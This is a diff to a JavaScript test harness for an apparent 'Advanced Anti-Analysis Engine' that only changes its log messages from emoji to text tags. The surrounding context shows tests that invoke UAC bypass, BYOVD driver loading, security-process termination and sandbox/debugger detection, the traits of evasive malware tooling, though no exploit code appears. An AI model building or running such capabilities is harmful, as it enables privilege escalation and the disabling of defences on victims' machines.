@@ -7,14 +7,14 @@ async function testAdvancedAntiAnalysis() {
     try {
         // Initialize the engine
         await advancedAntiAnalysis.initialize();
-        console.log('✓ Advanced Anti-Analysis Engine initialized successfully\n');
+        console.log('[INFO] Advanced Anti-Analysis Engine initialized successfully\n');
 
         // Test 1: Privilege Level Detection
         console.log('Test 1: Privilege Level Detection');
         const stats = advancedAntiAnalysis.getStats();
-        console.log(`✓ Privilege Level: ${stats.privilegeLevel}`);
-        console.log(`✓ Is Elevated: ${stats.isElevated}`);
-        console.log(`✓ Kernel Access: ${stats.kernelAccess}\n`);
+        console.log(`[INFO] Privilege Level: ${stats.privilegeLevel}`);
+        console.log(`[INFO] Is Elevated: ${stats.isElevated}`);
+        console.log(`[INFO] Kernel Access: ${stats.kernelAccess}\n`);
 
         // Test 2: UAC Bypass (if not already elevated)
         if (!stats.isElevated) {
@@ -25,9 +25,9 @@ async function testAdvancedAntiAnalysis() {
                     30000,
                     'uac-bypass-test'
                 );
-                console.log(`✓ UAC Bypass Result: ${JSON.stringify(uacResult, null, 2)}\n`);
+                console.log(`[INFO] UAC Bypass Result: ${JSON.stringify(uacResult, null, 2)}\n`);
             } catch (error) {
-                console.log(`⚠ UAC Bypass failed (expected if not in Windows environment): ${error.message}\n`);
+                console.log(`[INFO] UAC Bypass failed (expected if not in Windows environment): ${error.message}\n`);
             }
         } else {
             console.log('Test 2: UAC Bypass (skipped - already elevated)\n');
@@ -42,9 +42,9 @@ async function testAdvancedAntiAnalysis() {
                     60000,
                     'byovd-test'
                 );
-                console.log(`✓ BYOVD Result: ${JSON.stringify(byovdResult, null, 2)}\n`);
+                console.log(`[INFO] BYOVD Result: ${JSON.stringify(byovdResult, null, 2)}\n`);
             } catch (error) {
-                console.log(`⚠ BYOVD failed (expected if drivers not available): ${error.message}\n`);
+                console.log(`[INFO] BYOVD failed (expected if drivers not available): ${error.message}\n`);
             }
         } else {
             console.log('Test 3: BYOVD Driver Loading (skipped - not elevated)\n');
@@ -59,9 +59,9 @@ async function testAdvancedAntiAnalysis() {
                 15000,
                 'killpid-test'
             );
-            console.log(`✓ Process Termination Result: ${JSON.stringify(killResult, null, 2)}\n`);
+            console.log(`[INFO] Process Termination Result: ${JSON.stringify(killResult, null, 2)}\n`);
         } catch (error) {
-            console.log(`⚠ Process Termination failed (expected for current process): ${error.message}\n`);
+            console.log(`[INFO] Process Termination failed (expected for current process): ${error.message}\n`);
         }
 
         // Test 5: Anti-Analysis Detection
@@ -73,7 +73,7 @@ async function testAdvancedAntiAnalysis() {
                 'antianalysis-detect'
             );
             
-            console.log('✓ Anti-Analysis Detection Results:');
+            console.log('[INFO] Anti-Analysis Detection Results:');
             for (const [key, value] of Object.entries(detectionResult)) {
                 if (value.detected !== undefined) {
                     console.log(`  ${key}: ${value.detected ? 'DETECTED' : 'NOT DETECTED'}`);
@@ -81,7 +81,7 @@ async function testAdvancedAntiAnalysis() {
             }
             console.log('');
         } catch (error) {
-            console.log(`⚠ Anti-Analysis Detection failed: ${error.message}\n`);
+            console.log(`[INFO] Anti-Analysis Detection failed: ${error.message}\n`);
         }
 
         // Test 6: Individual Detection Methods
@@ -131,36 +131,36 @@ async function testAdvancedAntiAnalysis() {
         // Test 7: Engine Statistics
         console.log('Test 7: Engine Statistics');
         const finalStats = advancedAntiAnalysis.getStats();
-        console.log(`✓ Engine: ${finalStats.name}`);
-        console.log(`✓ Version: ${finalStats.version}`);
-        console.log(`✓ Initialized: ${finalStats.initialized}`);
-        console.log(`✓ UAC Bypass Methods: ${finalStats.uacBypassMethods}`);
-        console.log(`✓ BYOVD Drivers: ${finalStats.byovdDrivers}`);
-        console.log(`✓ Termination Methods: ${finalStats.terminationMethods}`);
-        console.log(`✓ Anti-Analysis Methods: ${finalStats.antiAnalysisMethods}`);
-        console.log(`✓ Active Operations: ${finalStats.activeOperations}\n`);
+        console.log(`[INFO] Engine: ${finalStats.name}`);
+        console.log(`[INFO] Version: ${finalStats.version}`);
+        console.log(`[INFO] Initialized: ${finalStats.initialized}`);
+        console.log(`[INFO] UAC Bypass Methods: ${finalStats.uacBypassMethods}`);
+        console.log(`[INFO] BYOVD Drivers: ${finalStats.byovdDrivers}`);
+        console.log(`[INFO] Termination Methods: ${finalStats.terminationMethods}`);
+        console.log(`[INFO] Anti-Analysis Methods: ${finalStats.antiAnalysisMethods}`);
+        console.log(`[INFO] Active Operations: ${finalStats.activeOperations}\n`);
 
         // Test 8: Anti-Freeze System Stats
         console.log('Test 8: Anti-Freeze System Statistics');
         const antiFreezeStats = cliAntiFreeze.getStats();
-        console.log(`✓ Anti-Freeze System: ${antiFreezeStats.name}`);
-        console.log(`✓ Version: ${antiFreezeStats.version}`);
-        console.log(`✓ Active Operations: ${antiFreezeStats.activeOperations}`);
-        console.log(`✓ Total Operations: ${antiFreezeStats.totalOperations}`);
-        console.log(`✓ Timeout Count: ${antiFreezeStats.timeoutCount}`);
-        console.log(`✓ Retry Count: ${antiFreezeStats.retryCount}\n`);
+        console.log(`[INFO] Anti-Freeze System: ${antiFreezeStats.name}`);
+        console.log(`[INFO] Version: ${antiFreezeStats.version}`);
+        console.log(`[INFO] Active Operations: ${antiFreezeStats.activeOperations}`);
+        console.log(`[INFO] Total Operations: ${antiFreezeStats.totalOperations}`);
+        console.log(`[INFO] Timeout Count: ${antiFreezeStats.timeoutCount}`);
+        console.log(`[INFO] Retry Count: ${antiFreezeStats.retryCount}\n`);
 
-        console.log('🎉 All advanced anti-analysis tests completed successfully!');
+        console.log('[SUCCESS] All advanced anti-analysis tests completed successfully!');
         console.log('\nKey Features Tested:');
-        console.log('✓ UAC Bypass Techniques (26 methods)');
-        console.log('✓ BYOVD Driver Loading (35+ drivers)');
-        console.log('✓ Advanced Process Termination (13 methods)');
-        console.log('✓ Comprehensive Anti-Analysis Detection (20 methods)');
-        console.log('✓ Anti-Freeze System Integration');
-        console.log('✓ Timeout Protection and Error Handling');
+        console.log('[INFO] UAC Bypass Techniques (26 methods)');
+        console.log('[INFO] BYOVD Driver Loading (35+ drivers)');
+        console.log('[INFO] Advanced Process Termination (13 methods)');
+        console.log('[INFO] Comprehensive Anti-Analysis Detection (20 methods)');
+        console.log('[INFO] Anti-Freeze System Integration');
+        console.log('[INFO] Timeout Protection and Error Handling');
 
     } catch (error) {
-        console.error('❌ Test failed:', error.message);
+        console.error('[ERROR] Test failed:', error.message);
         console.error(error.stack);
     }
 }
